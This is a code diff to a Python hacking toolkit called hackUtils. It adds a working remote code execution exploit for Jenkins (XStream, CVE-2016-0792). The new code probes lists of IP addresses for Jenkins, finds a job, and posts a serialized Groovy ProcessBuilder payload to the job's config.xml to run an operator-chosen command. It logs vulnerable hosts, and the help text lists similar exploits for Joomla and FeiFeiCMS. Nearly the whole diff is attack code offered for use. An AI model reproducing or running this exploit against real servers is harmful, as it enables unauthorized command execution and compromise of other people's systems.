@@ -447,7 +447,7 @@ def get_url(url, user_agent):
     headers = {
     'User-Agent': user_agent
     }
-    cookies = requests.get(url,timeout=10,headers=headers).cookies
+    cookies = requests.get(url,headers=headers).cookies
     for _ in range(3):
         response = requests.get(url, timeout=10, headers=headers, cookies=cookies)    
     return response.content
@@ -609,10 +609,119 @@ def fetchCensys(value,field,page):
     if os.path.exists(output):
         print "\n[INFO] Fetched IPs/URLs:"
         print "[*] Output File: "+output
+
+def rceXStreamJenkins(value):
+    value_ip = value.strip().split("::")[0]
+    if len(value.strip().split("::"))>1:
+        value_cmdstr = value.strip().split("::")[1]
+    else:
+        value_cmdstr = ""
+    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
+    print "["+str(now)+"] [INFO] Checking XStream (Jenkins CVE-2016-0792) Remote Code Execution..."
+    if os.path.exists(value_ip.strip()):
+        ipfile=open(value_ip,'r')
+    	for ip in ipfile:
+            if ip.strip():
+                checkXStreamJenkins(ip, value_cmdstr)
+    	ipfile.close()
+    else:
+        checkXStreamJenkins(value_ip, value_cmdstr)
+    output = os.path.dirname(os.path.realpath(__file__))+"/jenkins.txt"
+    if os.path.exists(output):
+        print "\n[INFO] Scanned Vuls:"
+        print "[*] Output File: "+output
+
+def checkXStreamJenkins(ip, cmdstr):
+    ip = ip.strip()
+    url = getURLFromJenkins(ip)
+    if url:
+        try:
+            result = requests.get(url,timeout=10).content
+            job = getJobFromJenkins(result)
+            if job:
+                job_url = url + job + "config.xml"
+                exploitXStreamJenkins(job_url, cmdstr)
+            else:
+                print '[!] no job found! url: '+url
+        except Exception,e:
+            print '[!] connection failed! url: '+url
+    else:
+        print '[!] connection failed! ip: '+ip
+
+def exploitXStreamJenkins(job_url, cmdstr):  
+    command = ""
+    if cmdstr == "":
+        command = "<string>dir</string>"
+    else:
+        cmd = cmdstr.split(" ")
+        for str in cmd:
+            command += "<string>" + str + "</string>" 
+    payload = "<map><entry><groovy.util.Expando><expandoProperties><entry><string>hashCode</string><org.codehaus.groovy.runtime.MethodClosure><delegate class=\"groovy.util.Expando\" reference=\"../../../..\"/><owner class=\"java.lang.ProcessBuilder\"><command>"+command+"</command><redirectErrorStream>false</redirectErrorStream></owner><resolveStrategy>0</resolveStrategy><directive>0</directive><parameterTypes/><maximumNumberOfParameters>0</maximumNumberOfParameters><method>start</method></org.codehaus.groovy.runtime.MethodClosure></entry></expandoProperties></groovy.util.Expando><int>1</int></entry></map>"
+
+    try:
+        res = requests.post(job_url,timeout=10,data = payload)
+        if res.status_code == 500:
+            html = res.content
+            if html:
+                reg = '.*java.io.IOException: Unable to read([^<>]*?)at hudson\.XmlFile\.*'
+                match = re.search(reg,html)
+                if match:
+                   job_path=match.group(1).strip()
+                   if ":" in job_path:
+                       system = "Windows"
+                   else:
+                       system = "Linux/Unix"
+                   vul= "[+] vuls found! url: "+job_url+", system: "+system+", job_path: "+job_path
+                   logfile(vul,'jenkins.txt')
+                   print vul
+                else:
+                    print '[!] exploit failed! job_url: '+job_url
+            else:
+                print '[!] exploit failed! job_url: '+job_url
+        else:
+            print '[!] exploit failed! job_url: '+job_url
+    except Exception:
+        print '[!] exploit failed! job_url: '+job_url
+
+def getURLFromJenkins(ip):
+    url1 = "http://"+ip+"/jenkins/"
+    url2 = "http://"+ip+":8080/jenkins/"
+    url3 = "http://"+ip+":8080/"
+    url4 = "http://"+ip+"/"
+    if returnCodeFromURL(url1) == 200:
+        return url1
+    elif returnCodeFromURL(url2) == 200:
+        return url2
+    elif returnCodeFromURL(url3) == 200:
+        return url3
+    elif returnCodeFromURL(url4) == 200:
+        return url4
+    else:
+        return ""
+
+def returnCodeFromURL(url):
+    try:
+        res = requests.get(url,timeout=10).status_code
+        return res
+    except Exception:
+        return ""
+
+def getJobFromJenkins(html):
+    try:
+        soup = BeautifulSoup(html)
+        html=soup.find('div', class_="dashboard")
+        html_doc=html.find('table', id="projectstatus")
+	href=html_doc.find_all('a', class_="model-link inside")[0].get('href')
+        if href:
+            return href
+        else:
+            return ""
+    except Exception:
+        return ""
     
 def myhelp():
     print "\n+-----------------------------+"
-    print "|  hackUtils v0.0.6           |"
+    print "|  hackUtils v0.0.7           |"
     print "|  Avfisher - avfisher.win    |"
     print "|  security_alert@126.com     |"
     print "+-----------------------------+\n"
@@ -627,6 +736,7 @@ def myhelp():
     print "  -j url|file, --joomla=url|file                      Exploit SQLi for Joomla 3.2 - 3.4"
     print "  -r url|file, --rce=url|file                         Exploit Remote Code Execution for Joomla 1.5 - 3.4.5 (Password: handle)"
     print "  -f url|file, --ffcms=url|file                       Exploit Remote Code Execution for FeiFeiCMS 2.8 (Password: 1)"
+    print "  -k ip|file[::cmd], --jenkins=ip|file[::cmd]         Exploit Remote Code Execution for XStream (Jenkins CVE-2016-0792)"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
     print "\nExamples:"
@@ -641,13 +751,17 @@ def myhelp():
     print "  hackUtils.py -r urls.txt"
     print "  hackUtils.py -f http://www.feifeicms.com/"
     print "  hackUtils.py -f urls.txt"
+    print "  hackUtils.py -k 10.10.10.10"
+    print "  hackUtils.py -k 10.10.10.10::dir"
+    print "  hackUtils.py -k ips.txt"
+    print "  hackUtils.py -k ips.txt::\"touch /tmp/jenkins\""
     print "  hackUtils.py -d example.com"
     print "  hackUtils.py -e text"
     print "\n[!] to see help message of options run with '-h'"
 
 def main():
     try:
-        options,args = getopt.getopt(sys.argv[1:],"hb:g:i:u:w:j:r:f:d:e:",["help","baidu=","google=","censysid=","censysurl=","wooyun=","joomla=","rce=","ffcms=","domain=","encrypt="])
+        options,args = getopt.getopt(sys.argv[1:],"hb:g:i:u:w:j:r:f:k:d:e:",["help","baidu=","google=","censysid=","censysurl=","wooyun=","joomla=","rce=","ffcms=","jenkins=","domain=","encrypt="])
     except getopt.GetoptError:
         print "\n[WARNING] error, to see help message of options run with '-h'"
         sys.exit()
@@ -671,6 +785,8 @@ def main():
             rceJoomla(value)
         if name in ("-f","--ffcms"):
             rceFeiFeiCMS(value)
+        if name in ("-k","--jenkins"):
+            rceXStreamJenkins(value)
         if name in ("-d","--domain"):
             scanSubDomains('baidu',value,50)
         if name in ("-e","--encrypt"):
